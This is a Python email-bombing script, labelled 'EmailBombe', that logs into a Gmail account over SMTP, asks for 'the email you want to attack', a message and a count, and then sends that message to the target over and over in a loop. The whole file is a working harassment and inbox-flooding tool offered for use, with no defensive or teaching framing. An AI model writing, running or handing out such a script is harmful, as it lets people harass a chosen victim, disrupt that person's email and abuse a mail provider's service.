import smtplib
import sys
import time

'''
please use it in private matter, i hate leechers.
'''

class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    WARNING = '\033[93m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
#every color works, so make it as you desire
def header():
    print(bcolors.HEADER + '''

                 .               
                 .               
                 .       :       
                 :      .        
        :..   :  : :  .          
           ..  ; :: .            
              ... .. :..         
             ::: :...            
         ::.:.:...;; .....       
      :..     .;.. :;     ..     
            . :. .  ;.           
             .: ;;: ;.           
            :; .BRRRV;           
               YB BMMMBR         
              ;BVIMMMMMt         
        .=YRBBBMMMMMMMB          
      =RMMMMMMMMMMMMMM;          
    ;BMMR=VMMMMMMMMMMMV.         
   tMMR::VMMMMMMMMMMMMMB:        
  tMMt ;BMMMMMMMMMMMMMMMB.       
 ;MMY ;MMMMMMMMMMMMMMMMMMV       
 XMB .BMMMMMMMMMMMMMMMMMMM:      
 BMI +MMMMMMMMMMMMMMMMMMMMi      
.MM= XMMMMMMMMMMMMMMMMMMMMY      
 BMt YMMMMMMMMMMMMMMMMMMMMi USS-ByBEN
 VMB +MMMMMMMMMMMMMMMMMMMM:      
 ;MM+ BMMMMMMMMMMMMMMMMMMR       
  tMBVBMMMMMMMMMMMMMMMMMB.       
   tMMMMMMMMMMMMMMMMMMMB:        
    ;BMMMMMMMMMMMMMMMMY          
      +BMMMMMMMMMMMBY:           
        :+YRBBBRVt;
   
                                      
                 
                                                                                ''')
class EmailBombe:
    def __init__(self):
        print(bcolors.YELLOW, bcolors.BOLD + "[?]Reading\n")

    def main(self):
        try:
            bruger = "email@gmail.com"
            gmail_password = "pswd"
            print(bcolors.YELLOW + "[?]Checks if logged in\n")
            server = smtplib.SMTP('smtp.gmail.com', 587)
#https://mail.google.com/mail/u/3/#settings/fwdandpop enable everything.
            server.ehlo() # SMTP protocol client
            print(bcolors.YELLOW + '[?]Transport Layer Security starts.')
            server.starttls()
            print(bcolors.WARNING + "[?]checks for SMTP")
            print(bcolors.HEADER + '[+] TLS RUNS PERFECT')
            server.ehlo() #SMTP protocol client
            server.login(bruger, gmail_password)
            print(bcolors.GREEN + '[+] Logged in\n')
        except KeyboardInterrupt:
            print(bcolors.YELLOW + "Thanks for this time.\n")
            sys.exit(1)
        except Exception as e:
            print(f"Error {e}, Goodbye")
            sys.exit(1)
        person = input(bcolors.YELLOW + '[/] Write the email you want to attack.  ')
        message = input(bcolors.YELLOW + '[\] Write the message you desire to send.. ')
        try:
            amount = int(input(bcolors.YELLOW + '[?]Amount')) #The desired amount of sends being controlled.
        except KeyboardInterrupt:
            print(bcolors.YELLOW + "[<3]Bye :(\n")
            sys.exit(1)
        except Exception as e:
            print(bcolors.RED + f'[-] {e}')
        print(bcolors.YELLOW + '[!]Sends email\n')
        t = time.time()
        for i in range(amount):
            server.sendmail(bruger, person, message)
            time.sleep(5.01) # delaying the time between the messages to dont make an error.
            print(bcolors.RED + f"[+] Email {i} sendt.")
        print('\n')
        print(bcolors.GREEN + f'  {time.time() - t}to send .')



if __name__ == "__main__":

    header()
    bomb = EmailBombe()
    bomb.main()
